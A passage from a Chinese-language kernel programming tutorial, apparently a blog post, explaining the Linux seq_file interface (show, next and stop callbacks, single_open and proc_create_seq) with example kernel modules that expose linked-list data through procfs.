class="hljs-type">const</span> <span class="hljs-type">char</span> *esc)</span><br></code></pre></td></tr></table></figure><p>正常打印完成需要返回 0，返回小于 0 的值表示出错，返回大于 0 的值（ <code>SEQ_SKIP</code> ）表示跳过该项，以下是我们的示例代码：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">int</span> <span class="hljs-title function_">a3kmod_seq_show</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> seq_file *m, <span class="hljs-type">void</span> *v)</span><br>&#123;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">a3_seq_data</span> *<span class="hljs-title">data</span> =</span> v;<br><br>    seq_printf(m, <span class="hljs-string">&quot;[a3kmod_data] data: %s\n&quot;</span>, data-&gt;data);<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="next-：获取指定偏移上的序列数据，自增偏移值"><a href="#next-：获取指定偏移上的序列数据，自增偏移值" class="headerlink" title="next()：获取指定偏移上的序列数据，自增偏移值"></a>next()：获取指定偏移上的序列数据，自增偏移值</h3><p><code>next()</code> 函数用以 <strong>根据传入的偏移值获取下一个序列数据对象，并更新偏移值</strong> ，在单次 session 中会迭代地调用 <code>next()</code> 函数，直到当前数据页无法继续装载，或是已经读取完序列上所有的数据</p><p>在 <code>next()</code> 函数当中，我们需要更新上层的 index （通常直接 <code>+1</code> 即可），并返回下一个序列数据对象，以下是我们的示例代码：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">void</span>* <span class="hljs-title function_">a3kmod_seq_next</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> seq_file *m, <span class="hljs-type">void</span> *v, <span class="hljs-type">loff_t</span> *ppos)</span><br>&#123;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">a3_seq_data</span> *<span class="hljs-title">ptr</span> =</span> v;<br><br>    (*ppos)++;<br><br>    ptr = list_next_entry(ptr, <span class="hljs-built_in">list</span>);<br>    <span class="hljs-keyword">if</span> (unlikely(list_entry_is_head(ptr, &amp;a3_seq_list, <span class="hljs-built_in">list</span>))) &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">return</span> ptr;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="stop-：序列文件关闭清理"><a href="#stop-：序列文件关闭清理" class="headerlink" title="stop()：序列文件关闭清理"></a>stop()：序列文件关闭清理</h3><p><code>stop()</code> 函数用于在单个 session 结束时进行一些自定义的需要的清理工作，因此通常也可以只是一个空函数，以下是我们的示例代码：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">void</span> <span class="hljs-title function_">a3kmod_seq_stop</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> seq_file *m, <span class="hljs-type">void</span> *v)</span><br>&#123;<br>    <span class="hljs-comment">/* do nothing */</span><br>&#125;<br></code></pre></td></tr></table></figure><h2 id="序列文件接口开发：初始化"><a href="#序列文件接口开发：初始化" class="headerlink" title="序列文件接口开发：初始化"></a>序列文件接口开发：初始化</h2><p>完成了序列文件接口四个函数的定义后，接下来我们需要在创建通用 VFS 节点时进行初始化，主要就是定义四个通用函数：</p><ul><li><code>open()</code> ：该函数中我们需要调用 <code>seq_open()</code> 进行初始化，其会分配一个 <code>seq_file</code> 结构体存放到 <code>file-&gt;private</code> ，我们也可以使用 <code>__seq_open_private()</code> （等价于多一次 kmalloc() 分配自定义数据对象）</li><li>二选一：<ul><li><code>read()</code> ：该函数指针需要被初始化为 <code>seq_read()</code> ，但你也可以再套个 wrapper</li><li><code>read_iter()</code> ：该函数指针需要被初始化为 <code>seq_read_iter()</code> ，但你也可以再套个 wrapper</li></ul></li><li><code>lseek()</code> ：该函数指针需要被初始化为 <code>seq_lseek()</code> ，但你也可以再套个 wrapper</li><li><code>release()</code> ：该函数指针需要被初始化为 <code>seq_release()</code> ，但你也可以再套个 wrapper</li></ul><p>之后像往常一样初始化文件接口即可，对序列文件接口的操作都会直接通过这些 <code>seq_*</code> API 完成，这极大地简化了开发者的工作，以下是我们以 <code>procfs</code> 为例的示例代码：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">const</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">seq_operations</span> <span class="hljs-title">a3kmod_seq_ops</span> =</span> &#123;<br>    .start  = a3kmod_seq_start,<br>    .show   = a3kmod_seq_show,<br>    .next   = a3kmod_seq_next,<br>    .stop   = a3kmod_seq_stop,<br>&#125;;<br><br><span class="hljs-type">static</span> <span class="hljs-type">int</span> <span class="hljs-title function_">a3kmod_open</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> inode *i, <span class="hljs-keyword">struct</span> file *f)</span><br>&#123;<br>    <span class="hljs-keyword">return</span> seq_open(f, &amp;a3kmod_seq_ops);<br>&#125;<br><br><span class="hljs-type">static</span> <span class="hljs-type">const</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">proc_ops</span> <span class="hljs-title">a3kmod_ops</span> =</span> &#123;<br>    .proc_open      = a3kmod_open,<br>    .proc_read      = seq_read,<br>    <span class="hljs-comment">//.proc_read_iter = seq_read_iter, /* it&#x27;s also okay! */</span><br>    .proc_lseek     = seq_lseek,<br>    .proc_release   = seq_release,<br>&#125;;<br><br><span class="hljs-type">static</span> <span class="hljs-type">void</span> <span class="hljs-title function_">a3kmod_release_data_list</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">a3_seq_data</span> *<span class="hljs-title">cur</span>, *<span class="hljs-title">next</span>;</span><br><br>    list_for_each_entry_safe(cur, next, &amp;a3_seq_list, <span class="hljs-built_in">list</span>) &#123;<br>        list_del(&amp;cur-&gt;<span class="hljs-built_in">list</span>);<br>        kfree(cur);<br>    &#125;<br>&#125;<br><br><span class="hljs-type">static</span> <span class="hljs-type">int</span> __init <span class="hljs-title function_">a3kmod_init</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">a3_seq_data</span> *<span class="hljs-title">data</span>;</span><br><br>    printk(KERN_INFO <span class="hljs-string">&quot;[a3kmod:] Hello to kernel space!\n&quot;</span>);<br><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">0x10</span>; i++) &#123;<br>        data = kmalloc(<span class="hljs-keyword">sizeof</span>(*data), GFP_KERNEL);<br>        <span class="hljs-keyword">if</span> (!data) &#123;<br>            printk(KERN_ERR <span class="hljs-string">&quot;[a3kmod:] FAILED to alloc data!\n&quot;</span>);<br>            a3kmod_release_data_list();<br>            <span class="hljs-keyword">return</span> -ENOMEM;<br>        &#125;<br><br>        <span class="hljs-built_in">sprintf</span>(data-&gt;data, <span class="hljs-string">&quot;arttnba3 - no.%.2d data&quot;</span>, i);<br>        list_add_tail(&amp;data-&gt;<span class="hljs-built_in">list</span>, &amp;a3_seq_list);<br>    &#125;<br>    <br>    <span class="hljs-keyword">if</span> (!proc_create(<span class="hljs-string">&quot;a3kmod&quot;</span>, <span class="hljs-number">0666</span>, <span class="hljs-literal">NULL</span>, &amp;a3kmod_ops)) &#123;<br>        printk(KERN_ERR <span class="hljs-string">&quot;[a3kmod:] FAILED to create procfs interface!\n&quot;</span>);<br>        a3kmod_release_data_list();<br>        <span class="hljs-keyword">return</span> -EACCES;<br>    &#125;<br><br>    printk(KERN_INFO <span class="hljs-string">&quot;[a3kmod:] Initialization done.\n&quot;</span>);<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br><span class="hljs-type">static</span> <span class="hljs-type">void</span> __exit <span class="hljs-title function_">a3kmod_exit</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>    printk(KERN_INFO <span class="hljs-string">&quot;[a3kmod:] Goodbye to kernel space!\n&quot;</span>);<br><br>    a3kmod_release_data_list();<br>    remove_proc_entry(<span class="hljs-string">&quot;a3kmod&quot;</span>, <span class="hljs-literal">NULL</span>);<br>&#125;<br><br>module_init(a3kmod_init);<br>module_exit(a3kmod_exit);<br>MODULE_LICENSE(<span class="hljs-string">&quot;GPL v2&quot;</span>);<br>MODULE_AUTHOR(<span class="hljs-string">&quot;arttnba3&quot;</span>);<br></code></pre></td></tr></table></figure><p>简单测试一下，可以看到内核非常完美地按照我们的需求输出了序列文件数据：</p><p><img src="https://s2.loli.net/2024/06/02/xL3wgmPoT9IUCN7.png"></p><h2 id="序列文件接口开发：single-file（仅单个序列对象读取的简易预实现）"><a href="#序列文件接口开发：single-file（仅单个序列对象读取的简易预实现）" class="headerlink" title="序列文件接口开发：single file（仅单个序列对象读取的简易预实现）"></a>序列文件接口开发：single file（仅单个序列对象读取的简易预实现）</h2><p> <code>/fs/seq_file.c</code> 中除了序列文件接口以外，还有一套已经写好的 <code>single_*</code> 开头的序列文件接口实现，开发者只需要补充实现 <code>show()</code> 函数即可，这通常用于一些并不需要太复杂实现的 <strong>只需要读取一次的</strong> 场景（例如读取 <code>/proc/self/stat</code> ）：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> *<span class="hljs-title function_">single_start</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> seq_file *p, <span class="hljs-type">loff_t</span> *pos)</span><br>&#123;<br><span class="hljs-keyword">return</span> *pos ? <span class="hljs-literal">NULL</span> : SEQ_START_TOKEN;<br>&#125;<br><br><span class="hljs-type">static</span> <span class="hljs-type">void</span> *<span class="hljs-title function_">single_next</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> seq_file *p, <span class="hljs-type">void</span> *v, <span class="hljs-type">loff_t</span> *pos)</span><br>&#123;<br>++*pos;<br><span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>;<br>&#125;<br><br><span class="hljs-type">static</span> <span class="hljs-type">void</span> <span class="hljs-title function_">single_stop</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> seq_file *p, <span class="hljs-type">void</span> *v)</span><br>&#123;<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">single_open</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> file *file, <span class="hljs-type">int</span> (*show)(<span class="hljs-keyword">struct</span> seq_file *, <span class="hljs-type">void</span> *),</span><br><span class="hljs-params"><span class="hljs-type">void</span> *data)</span><br>&#123;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">seq_operations</span> *<span class="hljs-title">op</span> =</span> kmalloc(<span class="hljs-keyword">sizeof</span>(*op), GFP_KERNEL_ACCOUNT);<br><span class="hljs-type">int</span> res = -ENOMEM;<br><br><span class="hljs-keyword">if</span> (op) &#123;<br>op-&gt;start = single_start;<br>op-&gt;next = single_next;<br>op-&gt;stop = single_stop;<br>op-&gt;show = show;<br>res = seq_open(file, op);<br><span class="hljs-keyword">if</span> (!res)<br>((<span class="hljs-keyword">struct</span> seq_file *)file-&gt;private_data)-&gt;private = data;<br><span class="hljs-keyword">else</span><br>kfree(op);<br>&#125;<br><span class="hljs-keyword">return</span> res;<br>&#125;<br>EXPORT_SYMBOL(single_open);<br></code></pre></td></tr></table></figure><p>使用 single file 实现我们只需要将前面的 <code>seq_open()</code> 替换为 <code>single_open()</code> 并定义一个 <code>show()</code> 即可，注意传给 <code>show()</code> 的序列对象永远都是 NULL ，以下是一个简单的例子：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;linux/module.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;linux/kernel.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;linux/init.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;linux/fs.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;linux/proc_fs.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;linux/seq_file.h&gt;</span></span><br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">a3_data</span> &#123;</span><br>    <span class="hljs-type">char</span> name[<span class="hljs-number">0x100</span>];<br>    <span class="hljs-type">size_t</span> age;<br>    <span class="hljs-type">size_t</span> money;<br>&#125; a3_info = &#123;<br>    .name   = <span class="hljs-string">&quot;arttnba3&quot;</span>,<br>    .age    = <span class="hljs-number">23</span>,<br>    .money  = <span class="hljs-number">0</span>,<br>&#125;;<br><br><span class="hljs-type">static</span> <span class="hljs-type">int</span> <span class="hljs-title function_">a3kmod_seq_show</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> seq_file *m, <span class="hljs-type">void</span> *v)</span><br>&#123;<br>    seq_printf(m, <span class="hljs-string">&quot;[a3kmod_data] name: %s\n&quot;</span>, a3_info.name);<br>    seq_printf(m, <span class="hljs-string">&quot;[a3kmod_data] age: %ld\n&quot;</span>, a3_info.age);<br>    seq_printf(m, <span class="hljs-string">&quot;[a3kmod_data] money: %ld\n&quot;</span>, a3_info.money);<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br><span class="hljs-type">static</span> <span class="hljs-type">int</span> <span class="hljs-title function_">a3kmod_open</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> inode *i, <span class="hljs-keyword">struct</span> file *f)</span><br>&#123;<br>    <span class="hljs-keyword">return</span> single_open(f, a3kmod_seq_show, <span class="hljs-literal">NULL</span>);<br>&#125;<br><br><span class="hljs-type">static</span> <span class="hljs-type">const</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">proc_ops</span> <span class="hljs-title">a3kmod_ops</span> =</span> &#123;<br>    .proc_open      = a3kmod_open,<br>    .proc_read      = seq_read,<br>    .proc_lseek     = seq_lseek,<br>    .proc_release   = seq_release,<br>&#125;;<br><br><span class="hljs-type">static</span> <span class="hljs-type">int</span> __init <span class="hljs-title function_">a3kmod_init</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>    <span class="hljs-keyword">if</span> (!proc_create(<span class="hljs-string">&quot;a3kmod&quot;</span>, <span class="hljs-number">0666</span>, <span class="hljs-literal">NULL</span>, &amp;a3kmod_ops)) &#123;<br>        printk(KERN_ERR <span class="hljs-string">&quot;[a3kmod:] FAILED to create procfs interface!\n&quot;</span>);<br>        <span class="hljs-keyword">return</span> -EACCES;<br>    &#125;<br><br><br><br>    printk(KERN_INFO <span class="hljs-string">&quot;[a3kmod:] Initialization done.\n&quot;</span>);<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br><span class="hljs-type">static</span> <span class="hljs-type">void</span> __exit <span class="hljs-title function_">a3kmod_exit</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>    printk(KERN_INFO <span class="hljs-string">&quot;[a3kmod:] Goodbye to kernel space!\n&quot;</span>);<br><br>    remove_proc_entry(<span class="hljs-string">&quot;a3kmod&quot;</span>, <span class="hljs-literal">NULL</span>);<br>&#125;<br><br>module_init(a3kmod_init);<br>module_exit(a3kmod_exit);<br>MODULE_LICENSE(<span class="hljs-string">&quot;GPL v2&quot;</span>);<br>MODULE_AUTHOR(<span class="hljs-string">&quot;arttnba3&quot;</span>);<br></code></pre></td></tr></table></figure><p>测试一下：</p><p><img src="https://s2.loli.net/2024/06/03/BMN2iSZJVb3kwht.png"></p><h2 id="序列文件接口开发：proc-seq-接口"><a href="#序列文件接口开发：proc-seq-接口" class="headerlink" title="序列文件接口开发：proc_seq 接口"></a>序列文件接口开发：proc_seq 接口</h2><p>proc_seq 接口同时提供了创建 procfs 节点与初始化 seq_file 的功能，我们只需要调用 <code>proc_create_seq()</code> 便能创建 procfs + 初始化 seq_file 一步到位，底层而言不同的是其帮我们实现的是 <code>read_iter</code> 接口而非 <code>read()</code> 接口，这意味着 <em>这样的序列文件可以从内核侧被读取</em></p><p>下面是对上面的链表读取的例子进行简单重写的例子：</p><blockquote><p>其实也没有简化太多…</p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;linux/module.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;linux/kernel.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;linux/init.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;linux/fs.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;linux/proc_fs.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;linux/seq_file.h&gt;</span></span><br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">a3_seq_data</span> &#123;</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">list_head</span> <span class="hljs-title">list</span>;</span><br>    <span class="hljs-type">char</span> data[<span class="hljs-number">0x100</span>];<br>&#125;;<br><br>LIST_HEAD(a3_seq_list);<br><br><span class="hljs-type">static</span> <span class="hljs-type">void</span>* <span class="hljs-title function_">a3kmod_seq_start</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> seq_file *m, <span class="hljs-type">loff_t</span> *ppos)</span><br>&#123;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">a3_seq_data</span> *<span class="hljs-title">ptr</span>;</span><br>    <span class="hljs-type">loff_t</span> cpos = <span class="hljs-number">0</span>;<br><br>    list_for_each_entry(ptr, &amp;a3_seq_list, <span class="hljs-built_in">list</span>) &#123;<br>        <span class="hljs-keyword">if</span> (cpos == (*ppos)) &#123;<br>            <span class="hljs-keyword">return</span> ptr;<br>        &#125;<br><br>        cpos++;<br>    &#125;<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>;<br>&#125;<br><br><span class="hljs-type">static</span> <span class="hljs-type">void</span>* <span class="hljs-title function_">a3kmod_seq_next</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> seq_file *m, <span class="hljs-type">void</span> *v, <span class="hljs-type">loff_t</span> *ppos)</span><br>&#123;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">a3_seq_data</span> *<span class="hljs-title">ptr</span> =</span> v;<br><br>    (*ppos)++;<br><br>    ptr = list_next_entry(ptr, <span class="hljs-built_in">list</span>);<br>    <span class="hljs-keyword">if</span> (unlikely(list_entry_is_head(ptr, &amp;a3_seq_list, <span class="hljs-built_in">list</span>))) &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">return</span> ptr;<br>&#125;<br><br><span class="hljs-type">static</span> <span class="hljs-type">int</span> <span class="hljs-title function_">a3kmod_seq_show</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> seq_file *m, <span class="hljs-type">void</span> *v)</span><br>&#123;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">a3_seq_data</span> *<span class="hljs-title">data</span> =</span> v;<br><br>    seq_printf(m, <span class="hljs-string">&quot;[a3kmod_data] data: %s\n&quot;</span>, data-&gt;data);<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br><span class="hljs-type">static</span> <span class="hljs-type">void</span> <span class="hljs-title function_">a3kmod_seq_stop</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> seq_file *m, <span class="hljs-type">void</span> *v)</span><br>&#123;<br>    <span class="hljs-comment">/* do nothing */</span><br>&#125;<br><br><span class="hljs-type">static</span> <span class="hljs-type">const</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">seq_operations</span> <span class="hljs-title">a3kmod_seq_ops</span> =</span> &#123;<br>    .start  = a3kmod_seq_start,<br>    .show   = a3kmod_seq_show,<br>    .next   = a3kmod_seq_next,<br>    .stop   = a3kmod_seq_stop,<br>&#125;;<br><br><span class="hljs-type">static</span> <span class="hljs-type">void</span> <span class="hljs-title function_">a3kmod_release_data_list</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">a3_seq_data</span> *<span class="hljs-title">cur</span>, *<span class="hljs-title">next</span>;</span><br><br>    list_for_each_entry_safe(cur, next, &amp;a3_seq_list, <span class="hljs-built_in">list</span>) &#123;<br>        list_del(&amp;cur-&gt;<span class="hljs-built_in">list</span>);<br>        kfree(cur);<br>    &#125;<br>&#125;<br><br><span class="hljs-type">static</span> <span class="hljs-type">int</span> __init <span class="hljs-title function_">a3kmod_init</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">a3_seq_data</span> *<span class="hljs-title">data</span>;</span><br><br>    printk(KERN_INFO <span class="hljs-string">&quot;[a3kmod:] Hello to kernel space!\n&quot;</span>);<br><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">0x10</span>; i++) &#123;<br>        data = kmalloc(<span class="hljs-keyword">sizeof</span>(*data), GFP_KERNEL);<br>        <span class="hljs-keyword">if</span> (!data) &#123;<br>            printk(KERN_ERR <span class="hljs-string">&quot;[a3kmod:] FAILED to alloc data!\n&quot;</span>);<br>            a3kmod_release_data_list();<br>            <span class="hljs-keyword">return</span> -ENOMEM;<br>        &#125;<br><br>        <span class="hljs-built_in">sprintf</span>(data-&gt;data, <span class="hljs-string">&quot;arttnba3 - no.%.2d data&quot;</span>, i);<br>        list_add_tail(&amp;data-&gt;<span class="hljs-built_in">list</span>, &amp;a3_seq_list);<br>    &#125;<br><br>    <span class="hljs-keyword">if</span> (!proc_create_seq(<span class="hljs-string">&quot;a3kmod&quot;</span>, <span class="hljs-number">0666</span>, <span class="hljs-literal">NULL</span>, &amp;a3kmod_seq_ops)) &#123;<br>        printk(KERN_ERR 